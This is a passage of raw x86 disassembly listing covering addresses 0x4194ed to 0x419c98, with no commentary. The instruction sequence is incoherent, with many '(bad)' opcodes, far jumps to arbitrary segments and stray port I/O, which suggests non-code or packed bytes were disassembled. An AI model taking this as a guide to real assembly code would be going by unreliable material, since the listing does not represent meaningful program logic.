  4194ed:	arpl   WORD PTR [ebp-0x5b],si
  4194f0:	pop    ebx
  4194f1:	pop    edx
  4194f2:	dec    esp
  4194f3:	adc    al,BYTE PTR [edx+ecx*2-0xd4f79d0]
  4194fa:	pushf  
  4194fb:	mov    ds:0x539bf1d2,eax
  419500:	sub    BYTE PTR [ecx-0x25],dl
  419503:	fisttp DWORD PTR [eax+ecx*8+0x1f04c208]
  41950a:	je     0x41954a
  41950c:	cmp    ch,BYTE PTR [edi+0x32de23a9]
  419512:	mov    edi,0xbb672d07
  419517:	pop    esi
  419518:	sbb    esi,DWORD PTR [ebx]
  41951a:	inc    esp
  41951b:	loopne 0x41950b
  41951d:	jp     0x41950d
  41951f:	jae    0x41957b
  419521:	enter  0xaffb,0xff
  419525:	add    BYTE PTR [esi+0x7192a3c6],ah
  41952b:	lods   al,BYTE PTR ds:[esi]
  41952c:	iret   
  41952d:	inc    ebp
  41952e:	lods   al,BYTE PTR ds:[esi]
  41952f:	pop    ecx
  419530:	inc    edx
  419531:	js     0x4194c9
  419533:	jmp    0x8539:0xa4002905
  41953a:	stos   DWORD PTR es:[edi],eax
  41953b:	push   cs
  41953c:	push   edx
  41953d:	xor    ebp,DWORD PTR [edx-0x6d09e996]
  419543:	outs   dx,BYTE PTR ds:[esi]
  419544:	add    al,0xb6
  419546:	sbb    DWORD PTR [ebp+0x36],ebx
  419549:	rcl    ebp,cl
  41954b:	pushf  
  41954c:	pushf  
  41954d:	xor    DWORD PTR ds:0x925da3d,ebp
  419553:	xor    edx,DWORD PTR [ebx+edi*8-0x2eec8acf]
  41955a:	adc    eax,0xea1e716a
  41955f:	cld    
  419560:	out    0x2c,eax
  419562:	retf   
  419563:	test   BYTE PTR [ebp+0x1d],bl
  419566:	or     cl,BYTE PTR [eax-0x1f57c42a]
  41956c:	cmc    
  41956d:	dec    edx
  41956e:	fwait
  41956f:	add    DWORD PTR [ebx],esi
  419571:	or     DWORD PTR [eax+0x6cc95d7e],ecx
  419577:	add    ecx,DWORD PTR [edx]
  419579:	jmp    0x419541
  41957b:	sbb    al,0xa4
  41957d:	dec    ebx
  41957e:	test   DWORD PTR [edi+edx*4+0x53],esi
  419582:	pop    ebp
  419583:	and    ebp,ebx
  419585:	je     0x419522
  419587:	xchg   DWORD PTR [ebx+0x3c4e2f49],eax
  41958d:	in     al,dx
  41958e:	jle    0x4195d9
  419590:	lahf   
  419591:	iret   
  419592:	and    DWORD PTR [eax],ebp
  419594:	sub    eax,0x6419432e
  419599:	nop
  41959a:	out    dx,al
  41959b:	lds    ecx,FWORD PTR [edi-0x6ec4a0dd]
  4195a1:	lahf   
  4195a2:	out    dx,eax
  4195a3:	std    
  4195a4:	inc    esp
  4195a5:	xchg   esi,eax
  4195a6:	mov    eax,0xb34c82db
  4195ab:	xchg   edx,eax
  4195ac:	mov    eax,ds:0x83eff83f
  4195b1:	inc    esi
  4195b2:	push   ebx
  4195b3:	sbb    dh,BYTE PTR [ebx+0x35]
  4195b6:	fdiv   st,st(5)
  4195b8:	jbe    0x41956e
  4195ba:	dec    edi
  4195bb:	repz pushf 
  4195bd:	out    0xa6,eax
  4195bf:	add    DWORD PTR [esi-0x11],ebp
  4195c2:	xor    ch,BYTE PTR [eax+edx*4-0x9]
  4195c6:	push   ecx
  4195c7:	nop
  4195c8:	dec    DWORD PTR [edi]
  4195ca:	int3   
  4195cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195cc:	xchg   DWORD PTR [edx],ebx
  4195ce:	dec    esp
  4195cf:	cmc    
  4195d0:	mov    DWORD PTR [ebx],ebx
  4195d2:	int    0xa1
  4195d4:	mov    esp,0x43b8c261
  4195d9:	lahf   
  4195da:	popa   
  4195db:	ins    DWORD PTR es:[edi],dx
  4195dc:	or     eax,DWORD PTR [edx+eiz*8-0x128f3372]
  4195e3:	or     ebx,eax
  4195e5:	popa   
  4195e6:	and    eax,0xec86eb54
  4195eb:	int    0x8c
  4195ed:	cmp    ebp,DWORD PTR [ecx+eax*2]
  4195f0:	sub    edx,edi
  4195f2:	sbb    eax,0xc0adce42
  4195f7:	jns    0x419605
  4195f9:	jmp    0x2301:0xc4fb2359
  419600:	fld    st(2)
  419602:	adc    bh,BYTE PTR [ebp+0x12]
  419605:	mov    ecx,0x9eb96e4c
  41960a:	push   esi
  41960b:	inc    esp
  41960c:	lods   eax,DWORD PTR ds:[esi]
  41960d:	icebp  
  41960e:	cld    
  41960f:	aaa    
  419610:	pop    esi
  419611:	test   al,0xda
  419613:	mov    BYTE PTR [edi-0x5c],0x53
  419617:	push   ds
  419618:	mov    al,0xbc
  41961a:	sti    
  41961b:	(bad)  
  41961c:	int    0x85
  41961e:	xchg   edi,eax
  41961f:	push   0xdd8ff41
  419624:	add    dl,BYTE PTR [ecx+edx*1-0x81c2cbc]
  41962b:	sbb    ebx,edx
  41962d:	por    mm1,QWORD PTR [ebx]
  419630:	ss mov esi,0x1f3c2f8c
  419636:	(bad)  
  419637:	cmp    bh,bl
  419639:	sti    
  41963a:	je     0x419676
  41963c:	cmp    dl,bh
  41963e:	mov    WORD PTR [edi+esi*4],gs
  419641:	imul   al
  419643:	xchg   DWORD PTR [edx-0x4bd0cbd0],eax
  419649:	cmp    DWORD PTR [eax+0x29d36146],esi
  41964f:	dec    eax
  419650:	imul   edi,ebp,0xa1e05058
  419656:	mov    dl,0x85
  419658:	jb     0x41961f
  41965a:	jp     0x41969e
  41965c:	ficomp DWORD PTR [edi]
  41965e:	push   eax
  41965f:	dec    ecx
  419660:	xchg   edx,eax
  419661:	sbb    BYTE PTR [edx],al
  419663:	pop    edi
  419664:	imul   esp,ebx,0x16121e
  41966a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41966b:	daa    
  41966c:	jecxz  0x4196b2
  41966e:	mov    edi,DWORD PTR [esi+ebp*2+0x77]
  419672:	cli    
  419673:	outs   dx,DWORD PTR ds:[esi]
  419674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419675:	(bad)  
  419676:	and    al,dh
  419678:	leave  
  419679:	xor    DWORD PTR [eax+0x65b2135c],eax
  41967f:	dec    ebx
  419680:	shr    DWORD PTR [ebx+esi*2-0x66e83367],0xc5
  419688:	sub    DWORD PTR [eax],ecx
  41968a:	das    
  41968b:	mov    DWORD PTR [edi-0x7fac6aa7],eax
  419691:	mov    dh,0x50
  419693:	loope  0x41969e
  419695:	jno    0x4196a0
  419697:	cmp    BYTE PTR [edx+eax*4-0x64],bl
  41969b:	adc    dh,BYTE PTR [esi]
  41969d:	inc    ebp
  41969e:	dec    edi
  41969f:	xlat   BYTE PTR ds:[ebx]
  4196a0:	shl    DWORD PTR [edx-0x73d3616d],cl
  4196a6:	dec    esi
  4196a7:	xchg   ebp,eax
  4196a8:	es pop ss
  4196aa:	outs   dx,BYTE PTR ds:[esi]
  4196ab:	or     eax,0x41ae572f
  4196b0:	lods   eax,DWORD PTR ds:[esi]
  4196b1:	push   ss
  4196b2:	push   ebx
  4196b3:	xchg   esp,eax
  4196b4:	and    DWORD PTR ds:0xe13f91e7,0x71
  4196bb:	push   ss
  4196bc:	cmp    BYTE PTR [esi-0x791f0fa6],dl
  4196c2:	push   eax
  4196c3:	cmp    BYTE PTR [eax+esi*2],0x57
  4196c7:	xchg   ecx,eax
  4196c8:	and    al,0x3
  4196ca:	jb     0x419732
  4196cc:	mov    cl,BYTE PTR [ecx]
  4196ce:	jg     0x41971b
  4196d0:	jle    0x419683
  4196d2:	jg     0x41972c
  4196d4:	ficom  WORD PTR [edi+esi*2-0x26]
  4196d8:	xchg   esi,eax
  4196d9:	jns    0x41972c
  4196db:	jne    0x4196d2
  4196dd:	mov    edi,DWORD PTR [esi]
  4196df:	adc    ebx,DWORD PTR [edi+0x7dbd95f7]
  4196e5:	retf   
  4196e6:	nop
  4196e7:	push   ebp
  4196e8:	aaa    
  4196e9:	out    0x79,eax
  4196eb:	or     BYTE PTR [edx],ch
  4196ed:	fadd   QWORD PTR [ebp-0x47c67fbf]
  4196f3:	into   
  4196f4:	es arpl bp,si
  4196f7:	ja     0x419760
  4196f9:	into   
  4196fa:	in     eax,0x2d
  4196fc:	xor    ah,dl
  4196fe:	cdq    
  4196ff:	(bad)  [esi+edx*1-0x57]
  419703:	stos   BYTE PTR es:[edi],al
  419704:	sub    esp,DWORD PTR [edi+eax*8-0x6ecb7c85]
  41970b:	test   BYTE PTR [eax-0x1d],cl
  41970e:	adc    al,0x7a
  419710:	xor    BYTE PTR [ebx+0x616836d8],ch
  419716:	hlt    
  419717:	xor    al,BYTE PTR [edi+0x73665ca8]
  41971d:	lods   eax,DWORD PTR ds:[esi]
  41971e:	pop    es
  41971f:	push   edi
  419720:	in     al,0xcc
  419722:	sub    BYTE PTR [edi-0x491c02bc],bl
  419728:	and    DWORD PTR [edi-0x5c3284b0],0x81bb771
  419732:	shl    ecx,0x44
  419735:	fdiv   QWORD PTR [ebx+0x29d86c8a]
  41973b:	test   DWORD PTR [ecx+0x2555ebed],0x20e0bd0a
  419745:	std    
  419746:	dec    esp
  419747:	mov    DWORD PTR [ebx-0x44],ecx
  41974a:	push   ss
  41974b:	bound  esp,QWORD PTR [esi+ecx*1+0x69bcf4dc]
  419752:	outs   dx,DWORD PTR ds:[esi]
  419753:	test   DWORD PTR [ebp+0x734df5f5],ecx
  419759:	les    ebx,FWORD PTR [esi-0x30]
  41975c:	outs   dx,DWORD PTR ds:[esi]
  41975d:	add    edi,DWORD PTR [edi+ebp*4]
  419760:	(bad)  
  419762:	inc    ax
  419764:	xchg   edi,eax
  419765:	shr    BYTE PTR [esp+esi*8],cl
  419768:	sbb    eax,0xc77fd888
  41976d:	and    ah,cl
  41976f:	push   cs
  419770:	rcl    BYTE PTR [ebx-0x49111ba2],1
  419776:	scas   al,BYTE PTR es:[edi]
  419777:	call   0x4a4b:0xa6cae877
  41977e:	pusha  
  41977f:	add    eax,0x60084e5b
  419784:	cmp    ah,BYTE PTR [edi+0x42]
  419787:	mov    bh,BYTE PTR [ebp+0x47854e64]
  41978d:	and    eax,0xdeaafdfc
  419792:	push   edi
  419793:	lds    ebp,FWORD PTR [edi]
  419795:	pop    edi
  419796:	push   es
  419797:	sbb    al,0x13
  419799:	adc    DWORD PTR [esi-0x2f],esi
  41979c:	cs jnp 0x41973c
  41979f:	jle    0x4197d5
  4197a1:	arpl   WORD PTR [esp+ebp*1-0x4274478f],ax
  4197a8:	dec    ebp
  4197a9:	in     eax,0x7a
  4197ab:	mov    edx,0x58ee6449
  4197b0:	push   cs
  4197b1:	shl    BYTE PTR [edi-0xb066f5a],cl
  4197b7:	aam    0xdf
  4197b9:	sub    dh,BYTE PTR [edx+0x70]
  4197bc:	fwait
  4197bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197be:	push   0xffffff8f
  4197c0:	out    0x9,eax
  4197c2:	cmp    BYTE PTR [edx+0xb],0x56
  4197c6:	fdivr  QWORD PTR [edx-0xc36f0d1]
  4197cc:	and    DWORD PTR ds:0x285799c1,ebp
  4197d2:	into   
  4197d3:	xlat   BYTE PTR ds:[ebx]
  4197d4:	fadd   QWORD PTR [eax-0x11751a40]
  4197da:	xchg   esi,eax
  4197db:	shr    DWORD PTR [ecx],1
  4197dd:	fsub   QWORD PTR [eax+0x192aa681]
  4197e3:	pop    ds
  4197e4:	imul   ebp,esp,0xffffffe0
  4197e7:	pop    ebx
  4197e8:	dec    edi
  4197e9:	jae    0x4197cf
  4197eb:	dec    esp
  4197ec:	push   ecx
  4197ed:	mov    ebp,DWORD PTR [ebx+0x3f]
  4197f0:	and    esi,DWORD PTR [esi+0x78]
  4197f3:	push   edi
  4197f4:	add    DWORD PTR [edi],edi
  4197f6:	push   edx
  4197f7:	jb     0x419780
  4197f9:	sub    al,bh
  4197fb:	repz push 0x70
  4197fe:	aam    0xf6
  419800:	fisub  WORD PTR [ebp+ebp*2-0x6fe8f149]
  419807:	adc    eax,0xca4b4631
  41980c:	stos   DWORD PTR es:[edi],eax
  41980d:	mov    ah,0xc1
  41980f:	xor    esp,DWORD PTR [edi+0x5b375feb]
  419815:	pop    ecx
  419816:	repz pop esi
  419818:	jbe    0x419895
  41981a:	jmp    0x6d91:0xb37825f8
  419821:	cmp    eax,0xed4fa5fd
  419826:	cdq    
  419827:	(bad)  
  419828:	pop    ss
  419829:	cmp    al,0xbf
  41982b:	imul   ebp,DWORD PTR [edx],0x96ae35c4
  419831:	loope  0x41983d
  419833:	repnz pop ebp
  419835:	sub    eax,ecx
  419837:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419838:	outs   dx,DWORD PTR ds:[esi]
  419839:	push   ss
  41983a:	pop    es
  41983b:	fs and al,0xa0
  41983e:	pusha  
  41983f:	scas   eax,DWORD PTR es:[edi]
  419840:	jp     0x419876
  419842:	xor    eax,esp
  419844:	sub    bh,BYTE PTR [edi-0xb]
  419847:	ret    0x169f
  41984a:	ror    ah,0xf8
  41984d:	xor    BYTE PTR [ecx],dh
  41984f:	sahf   
  419850:	hlt    
  419851:	test   BYTE PTR [esi],cl
  419853:	jno    0x4198b4
  419855:	mov    dl,0xef
  419857:	mov    ah,0x61
  419859:	mov    ah,0x75
  41985b:	jne    0x4198ca
  41985d:	sbb    cl,BYTE PTR [edx-0x3a3e8252]
  419863:	aam    0x54
  419865:	fptan  
  419867:	es leave 
  419869:	inc    ebp
  41986a:	ret    
  41986b:	call   0x8768:0xd7ad324c
  419872:	inc    edi
  419873:	lgs    ecx,FWORD PTR [edx]
  419876:	mov    ebx,0xc1083006
  41987b:	push   ds
  41987c:	dec    ebx
  41987d:	jmp    0x4198d6
  41987f:	jmp    0x419804
  419881:	test   DWORD PTR [edi-0x56c2a05a],edi
  419887:	jge    0x4198d4
  419889:	dec    edx
  41988a:	popf   
  41988b:	sbb    al,0x5f
  41988d:	cli    
  41988e:	(bad)
  419892:	xor    al,0x63
  419894:	dec    esi
  419895:	adc    eax,0xf9e39f1e
  41989a:	lods   al,BYTE PTR ds:[esi]
  41989b:	aaa    
  41989c:	sub    bh,BYTE PTR [eax]
  41989e:	shr    DWORD PTR [edi-0xc],0x79
  4198a2:	out    dx,al
  4198a3:	int3   
  4198a4:	dec    ecx
  4198a5:	out    dx,eax
  4198a6:	and    bh,BYTE PTR [esi]
  4198a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198a9:	push   ss
  4198aa:	push   ds
  4198ab:	data16 jo 0x419923
  4198ae:	sub    al,0x9f
  4198b0:	push   es
  4198b1:	aam    0xf3
  4198b3:	ror    BYTE PTR [edx],cl
  4198b5:	ins    DWORD PTR es:[edi],dx
  4198b6:	jno    0x4198fa
  4198b8:	or     eax,DWORD PTR [edi+0x3a]
  4198bb:	inc    ecx
  4198bc:	mov    ah,0xab
  4198be:	cli    
  4198bf:	retf   
  4198c0:	or     eax,0x1c4842c7
  4198c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198c6:	xchg   esi,eax
  4198c7:	mov    bh,0x74
  4198c9:	in     al,dx
  4198ca:	popa   
  4198cb:	adc    dl,BYTE PTR [eax-0x4e]
  4198ce:	inc    ebp
  4198cf:	push   edi
  4198d0:	lea    esi,[eax]
  4198d2:	or     al,0xce
  4198d4:	push   ss
  4198d5:	mov    ch,0xb8
  4198d7:	pop    esp
  4198d8:	ja     0x4198da
  4198da:	iret   
  4198db:	enter  0xebee,0x8f
  4198df:	(bad)  
  4198e0:	lds    esp,FWORD PTR [ecx]
  4198e2:	mov    gs,WORD PTR [ecx+0x2a6de29e]
  4198e8:	hlt    
  4198e9:	mov    esp,edi
  4198eb:	pop    es
  4198ec:	call   0xa5be:0xce7bab3a
  4198f3:	dec    esp
  4198f4:	pop    eax
  4198f5:	mov    ch,0xb5
  4198f7:	jno    0x419921
  4198f9:	popf   
  4198fa:	cld    
  4198fb:	jg     0x4198fd
  4198fd:	xchg   edi,eax
  4198fe:	mov    WORD PTR [ebx*1+0x62f517fe],ss
  419905:	outs   dx,DWORD PTR ds:[esi]
  419906:	jmp    0xbc66:0xc617588d
  41990d:	mov    eax,ds:0xfb817e64
  419912:	sub    ebp,ebp
  419914:	inc    edi
  419915:	or     al,0x93
  419917:	imul   ebp,DWORD PTR [edx+0x2d],0xbda42b1c
  41991e:	out    0x4c,al
  419920:	aad    0x33
  419922:	push   0xffffffed
  419924:	ror    BYTE PTR [ecx-0x10],0xed
  419928:	ret    
  419929:	jmp    0xd2e9e739
  41992e:	stc    
  41992f:	in     al,dx
  419930:	jmp    0x4198dc
  419932:	enter  0x9ae5,0x49
  419936:	std    
  419937:	lahf   
  419938:	sbb    al,dh
  41993a:	mov    dh,BYTE PTR [ebx+0x7c270bf6]
  419940:	scas   eax,DWORD PTR es:[edi]
  419941:	std    
  419942:	push   0x56
  419944:	add    al,0xca
  419946:	in     eax,dx
  419947:	push   esp
  419948:	(bad)  
  419949:	int    0x29
  41994b:	dec    edx
  41994c:	mov    cl,0xdf
  41994e:	inc    ecx
  41994f:	dec    ebx
  419950:	pop    edx
  419951:	xor    ecx,DWORD PTR [edx+0x20]
  419954:	(bad)  
  419955:	cmp    edi,esp
  419957:	pop    ds
  419958:	aam    0x28
  41995a:	mov    bl,0x71
  41995c:	mov    eax,ds:0x9ef7f7d9
  419961:	fstp   TBYTE PTR cs:[ebp+0x50421676]
  419968:	push   ebx
  419969:	sbb    bh,cl
  41996b:	add    BYTE PTR [eax+0x6c],bh
  41996e:	lahf   
  41996f:	push   ecx
  419970:	or     dh,BYTE PTR ds:0x4b5e9aa9
  419976:	xchg   DWORD PTR [eax+0x7e1efaee],edx
  41997c:	xor    esi,DWORD PTR [eax+0x7a165bea]
  419982:	pop    ebp
  419983:	jmp    0x5aad:0xc44a5d7a
  41998a:	in     al,0xa2
  41998c:	cmp    dl,dh
  41998e:	fcomp  DWORD PTR [ebx]
  419990:	pop    esp
  419991:	mov    ecx,0xaf6020ff
  419996:	shl    DWORD PTR [esi+0x6d],0x35
  41999a:	mov    edx,0x9433400b
  41999f:	mov    dl,0x82
  4199a1:	push   ecx
  4199a2:	mov    fs,WORD PTR [edi+edi*1+0x66]
  4199a6:	push   ebp
  4199a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199a8:	sbb    DWORD PTR [ebx-0xff94dd0],ecx
  4199ae:	repz sub ecx,DWORD PTR [ebp-0x5d55bb8d]
  4199b5:	lahf   
  4199b6:	lahf   
  4199b7:	jns    0x4199cc
  4199b9:	arpl   WORD PTR [ebp+0x5f],sp
  4199bc:	mov    edx,0xdfc491f3
  4199c1:	loop   0x419954
  4199c3:	popa   
  4199c4:	and    al,0x65
  4199c6:	nop
  4199c7:	in     al,0xdc
  4199c9:	push   es
  4199ca:	gs mov eax,0x14998227
  4199d0:	(bad)  
  4199d1:	arpl   dx,ax
  4199d3:	and    DWORD PTR [edi-0x4f65e266],ebp
  4199d9:	data16 xchg BYTE PTR [edx+0x24],cl
  4199dd:	shr    DWORD PTR [ebx],cl
  4199df:	cmp    al,0x8d
  4199e1:	retf   
  4199e2:	cmc    
  4199e3:	jmp    0xa8a4:0xb1b8ffa4
  4199ea:	dec    esp
  4199eb:	xor    BYTE PTR [ecx],bh
  4199ed:	inc    edi
  4199ee:	jmp    0x432c5f5
  4199f3:	cmc    
  4199f4:	xor    al,0xe5
  4199f6:	pop    es
  4199f7:	test   DWORD PTR [eax-0x6a],edx
  4199fa:	jnp    0x4199ff
  4199fc:	cmp    edx,ecx
  4199fe:	xor    edi,DWORD PTR [eax]
  419a00:	xchg   edi,eax
  419a01:	push   edx
  419a02:	bound  edx,QWORD PTR [edi-0x13]
  419a05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a06:	fist   DWORD PTR [ecx-0x52]
  419a09:	sti    
  419a0a:	push   ecx
  419a0b:	mov    esi,0x8c253242
  419a10:	sub    BYTE PTR [eax+0x7a99fb44],bl
  419a16:	les    esp,FWORD PTR [esi+0x2b]
  419a19:	mov    BYTE PTR [esi+esi*4],ch
  419a1c:	aam    0xc
  419a1e:	stc    
  419a1f:	std    
  419a20:	into   
  419a21:	sbb    dh,0x4f
  419a24:	and    DWORD PTR [eax],esp
  419a26:	outs   dx,BYTE PTR ds:[esi]
  419a27:	loopne 0x419a24
  419a29:	push   ebx
  419a2a:	int    0x37
  419a2c:	inc    eax
  419a2d:	idiv   DWORD PTR [edx]
  419a2f:	sar    DWORD PTR [edi+ebx*2-0x14],cl
  419a33:	or     BYTE PTR [ebx+0x2f372486],0x64
  419a3a:	inc    eax
  419a3b:	ja     0x419a13
  419a3d:	fstp   TBYTE PTR [edx+0x77ecc288]
  419a43:	xchg   ebp,eax
  419a44:	fistp  DWORD PTR [eax-0x6cc214e2]
  419a4a:	xchg   ebp,eax
  419a4b:	add    esp,DWORD PTR [edi-0x3d30262]
  419a51:	scas   al,BYTE PTR es:[edi]
  419a52:	outs   dx,BYTE PTR ds:[esi]
  419a53:	jle    0x4199e3
  419a55:	cdq    
  419a56:	dec    ecx
  419a57:	nop
  419a58:	xchg   edx,eax
  419a59:	jbe    0x419acf
  419a5b:	fwait
  419a5c:	mov    eax,0xd2358198
  419a61:	leave  
  419a62:	(bad)  
  419a63:	mul    DWORD PTR [ebx]
  419a65:	jb     0x419a59
  419a67:	iret   
  419a68:	stos   DWORD PTR es:[edi],eax
  419a69:	call   0x16b5:0x7e53572f
  419a70:	jl     0x419a76
  419a72:	jnp    0x419ae0
  419a74:	push   cs
  419a75:	mov    esi,0x88dda982
  419a7a:	mov    ebx,DWORD PTR ds:0xcdc9f77
  419a80:	sub    eax,0x6aba22d
  419a85:	imul   eax,DWORD PTR [edx+0x930eaff],0x5e
  419a8c:	adc    esp,eax
  419a8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a8f:	outs   dx,BYTE PTR ds:[esi]
  419a90:	or     al,0x55
  419a92:	vpcmpgtw xmm5,xmm7,XMMWORD PTR [edx]
  419a96:	pusha  
  419a97:	add    BYTE PTR ds:0xacb3866b,0xfc
  419a9e:	mov    ds:0xe6ca4cf2,eax
  419aa3:	mov    edi,0x6cc4ac89
  419aa8:	aad    0xa8
  419aaa:	pop    ss
  419aab:	fsub   st,st(6)
  419aad:	mov    ds:0xf8970b23,al
  419ab2:	add    edi,DWORD PTR [ebx+0x19832b9d]
  419ab8:	adc    al,0x68
  419aba:	shl    ebx,0xe
  419abd:	test   BYTE PTR [esp+0xab2d99e],bl
  419ac4:	mov    esi,0x45b99373
  419ac9:	dec    ebp
  419aca:	outs   dx,DWORD PTR ds:[esi]
  419acb:	das    
  419acc:	push   esp
  419acd:	mov    dl,0x47
  419acf:	pop    esp
  419ad0:	sbb    eax,0xb0fdfbce
  419ad5:	sub    ebp,DWORD PTR [ebx-0x1b]
  419ad8:	sar    BYTE PTR [ebx],1
  419ada:	nop    DWORD PTR [eax-0x243d37a2]
  419ae1:	dec    esi
  419ae2:	xchg   edx,eax
  419ae3:	mov    ebp,0x261c1964
  419ae8:	imul   edx,eax,0x200f0eba
  419aee:	retf   
  419aef:	mov    dh,0xdb
  419af1:	nop
  419af2:	pop    es
  419af3:	bound  esi,QWORD PTR [eax+0x47]
  419af6:	ds pusha 
  419af8:	shr    ch,1
  419afa:	aas    
  419afb:	(bad)  
  419afc:	retf   
  419afd:	fdivr  DWORD PTR [ebx+ebx*8+0x71]
  419b01:	sbb    eax,0x12a69e2e
  419b06:	call   0x99a1c26d
  419b0b:	mov    esi,0x935d46bb
  419b10:	xor    al,0x97
  419b12:	test   BYTE PTR [edi+0x55],0x3
  419b16:	popa   
  419b17:	into   
  419b18:	inc    esi
  419b19:	mov    bl,0xb4
  419b1b:	mov    DWORD PTR [esi+0x548b4fc9],edi
  419b21:	rol    ah,1
  419b23:	test   eax,0x36bc3bf2
  419b28:	cmp    al,0xff
  419b2a:	ror    esi,1
  419b2c:	fwait
  419b2d:	cwde   
  419b2e:	gs push eax
  419b30:	and    edx,edx
  419b32:	or     al,0x26
  419b34:	outs   dx,BYTE PTR ds:[esi]
  419b35:	add    BYTE PTR [eax+0x21],bh
  419b38:	jb     0x419b46
  419b3a:	cmp    BYTE PTR [ebx+edx*2-0x5c],0xf4
  419b3f:	or     eax,0xb61c4957
  419b44:	mov    al,ds:0x9504919f
  419b49:	mov    BYTE PTR [ebx+edi*8],ch
  419b4c:	mov    dl,bl
  419b4e:	clc    
  419b4f:	pop    edi
  419b50:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  419b52:	inc    ebx
  419b53:	pushf  
  419b54:	mov    edi,0xde633af3
  419b59:	and    DWORD PTR [edi],edi
  419b5b:	and    al,cl
  419b5d:	push   edi
  419b5e:	in     eax,0xee
  419b60:	add    BYTE PTR [edi+0x7a],al
  419b63:	mov    bh,0xa2
  419b65:	ins    BYTE PTR es:[edi],dx
  419b66:	mov    cl,0xdb
  419b68:	jecxz  0x419bad
  419b6a:	shl    DWORD PTR [esi],0xa2
  419b6d:	shl    al,cl
  419b6f:	cmp    edi,DWORD PTR [ecx]
  419b71:	xor    bl,bh
  419b73:	cs pusha 
  419b75:	(bad)  
  419b76:	jl     0x419b19
  419b78:	ret    
  419b79:	xor    DWORD PTR [edx+ebp*2-0x566262cc],ebp
  419b80:	push   DWORD PTR [edx]
  419b82:	(bad)  
  419b83:	fcmovu st,st(4)
  419b85:	push   ss
  419b86:	sbb    ecx,eax
  419b88:	xor    ebx,DWORD PTR [edi+0x5cb8e673]
  419b8e:	pop    edx
  419b8f:	pop    ebp
  419b90:	les    ebp,FWORD PTR [ecx]
  419b92:	mov    al,0x3b
  419b94:	mov    bh,0x6
  419b96:	imul   ecx,DWORD PTR [edi+0x3e],0xfffffff0
  419b9a:	call   ebx
  419b9c:	test   eax,0xb27100a5
  419ba1:	push   edx
  419ba2:	adc    BYTE PTR [ebp+0x5ad8bdc2],0xd7
  419ba9:	xchg   DWORD PTR [ecx],esp
  419bab:	repz icebp 
  419bad:	mov    esp,0x8059e598
  419bb2:	out    dx,eax
  419bb3:	push   0x41fac02c
  419bb8:	sbb    DWORD PTR [esi+edi*2],edi
  419bbb:	dec    eax
  419bbc:	cs inc edx
  419bbe:	inc    edx
  419bbf:	test   DWORD PTR [edx],eax
  419bc1:	and    bh,al
  419bc3:	shl    DWORD PTR [edi],0xba
  419bc6:	jne    0x419c3a
  419bc8:	inc    ebx
  419bc9:	jge    0x419c42
  419bcb:	adc    eax,0x7c3d4bb0
  419bd0:	mov    al,ds:0x242ba94d
  419bd5:	aas    
  419bd6:	(bad)  
  419bd7:	bound  esp,QWORD PTR [eax+0x3c56faf5]
  419bdd:	mov    ch,0x43
  419bdf:	inc    ebx
  419be0:	xchg   ecx,eax
  419be1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419be2:	sbb    edx,DWORD PTR [esi]
  419be4:	dec    edx
  419be5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419be6:	push   edi
  419be7:	mov    ecx,0x9c0da814
  419bec:	xlat   BYTE PTR ds:[ebx]
  419bed:	les    ebp,FWORD PTR [edi]
  419bef:	cmp    BYTE PTR [edi-0x7],bh
  419bf2:	sbb    al,0xf0
  419bf4:	push   ebp
  419bf5:	sbb    al,0x61
  419bf7:	addr16 push esi
  419bf9:	mov    ecx,0x1e7e6c7e
  419bfe:	pop    ebx
  419bff:	stos   DWORD PTR es:[edi],eax
  419c00:	test   eax,0x3ec2026d
  419c05:	push   ss
  419c06:	mov    edx,0xa528a7e8
  419c0b:	dec    edi
  419c0c:	shr    DWORD PTR [edx],cl
  419c0e:	shr    DWORD PTR [edi-0x655386a9],1
  419c14:	sub    cl,dl
  419c16:	sbb    ebp,ecx
  419c18:	(bad)  
  419c19:	jmp    0x419c3d
  419c1b:	mov    al,ds:0x4de2f69c
  419c20:	mov    ch,0x2a
  419c22:	fisttp QWORD PTR ds:0xeb96194b
  419c28:	cmp    DWORD PTR ds:0xbaf2f8ac,ebx
  419c2e:	aam    0x32
  419c30:	push   bx
  419c32:	xchg   edi,eax
  419c33:	aaa    
  419c34:	sub    eax,edx
  419c36:	scas   eax,DWORD PTR es:[edi]
  419c37:	inc    ecx
  419c38:	in     al,0xa
  419c3a:	mov    edx,0xa89958e6
  419c3f:	push   ecx
  419c40:	movlhps xmm4,xmm4
  419c43:	jg     0x419cc2
  419c45:	sti    
  419c46:	je     0x419bf0
  419c48:	gs ret 
  419c4a:	jmp    0x419c0f
  419c4c:	lahf   
  419c4d:	mov    WORD PTR [ebx],ds
  419c4f:	adc    eax,0x1d317764
  419c54:	cs ja  0x419c50
  419c57:	sub    al,0xd2
  419c59:	mov    edi,0xe2ae3d55
  419c5e:	fmulp  st(2),st
  419c60:	xchg   edx,eax
  419c61:	mov    ebp,0xfd7201bf
  419c66:	popf   
  419c67:	push   0xffffff97
  419c69:	scas   al,BYTE PTR es:[edi]
  419c6a:	pop    ebp
  419c6b:	push   cs
  419c6c:	loope  0x419bf9
  419c6e:	bound  edi,QWORD PTR [edi-0x69]
  419c71:	jg     0x419cbe
  419c73:	xchg   edi,eax
  419c74:	jge    0x419cce
  419c76:	cmp    bl,BYTE PTR [bp+si-0x5c]
  419c7a:	fprem1 
  419c7c:	xor    dl,BYTE PTR [ecx+ecx*1-0x6a484536]
  419c83:	loopne 0x419c6d
  419c85:	add    al,0x3d
  419c87:	or     al,0x21
  419c89:	fild   QWORD PTR ds:0xbde7c80
  419c8f:	mul    DWORD PTR [ecx-0x2c]
  419c92:	xchg   ebx,eax
  419c93:	pop    ebp
  419c94:	nop
  419c95:	je     0x419cfe
  419c97:	push   ebp
  419c98:	lea    eax,[esi]
